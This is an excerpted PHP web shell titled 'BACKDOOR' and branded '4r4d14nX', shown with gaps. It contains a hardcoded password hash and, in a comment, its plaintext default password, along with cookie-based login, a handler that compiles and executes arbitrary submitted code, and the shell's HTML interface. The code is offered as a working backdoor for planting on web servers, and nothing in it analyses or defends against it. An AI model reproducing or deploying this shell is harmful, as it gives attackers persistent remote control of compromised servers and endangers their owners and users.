...
$s_pass = "633d9a6f74cb2785e40c48a9a3c1d77b1102df75"; // default password : 4r4d14nX (login and change to new password)

$s_ver = " -"; // shell ver
$s_title = "BACKDOOR".$s_ver; // shell title
...
if(strlen(trim($s_pass))>0){
    if(isset($_COOKIE['4r4d14nX'])){
        if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['4r4d14nX']))) $s_auth = true;
    }
    if(isset($_GP['login'])){
        $s_login = kript($_GP['login']);
        if(strtolower(trim($s_pass)) == $s_login){
            setcookie("4r4d14nX",$s_login,time() + $s_login_time);
            $s_auth = true;
        }
    }
    if(isset($_GP['x']) && ($_GP['x']=='logout')){
        $persist = array("theme", "cwd");
        $s_reload = (isset($_COOKIE['4r4d14nX_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
...
if(isset($_COOKIE['4r4d14nX_included'])){
    if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
    else{
        $s_self = "?";
        setcookie("4r4d14nX_included", "0" ,time() - $s_login_time);
    ...
    if(strcmp($s_cek1,$s_cek2)!=0){
        ...
        setcookie("4r4d14nX_included", "1" ,time() + $s_login_time);
        setcookie("s_self", $s_self ,time() + $s_login_time);
    }
    else{
        $s_self = "?";
        ...
        if(isset($_GP['evalcode'])){
            ...
            elseif(strtolower($s_lang)=='java'){
                if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
                    ...
                    $s_rand = "4r4d14nX_".substr(md5(time().rand(0,100)),0,8);
                    $s_script = $s_rand;
...
<?php if($s_auth){?>
    ...
    <?php }
    ?><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span class='schemabox'>&nbsp;&nbsp;</span></a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>4r4d14nX</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>   <td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table></div>
...
<?php } else{ ?>
    ...
    4r4d14nX&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
    <input class='inputzbut' type='submit' value='Go !' name='submitlogin' style='width:80px;' />
    </form>
    </div>
<?php }?>   </td></tr></table>
<p class='footer'>Jayalah Indonesiaku &copy;<?php echo @date("Y",time())." "; ?>4r4d14nX</p>
<?php echo $main_scs;?>
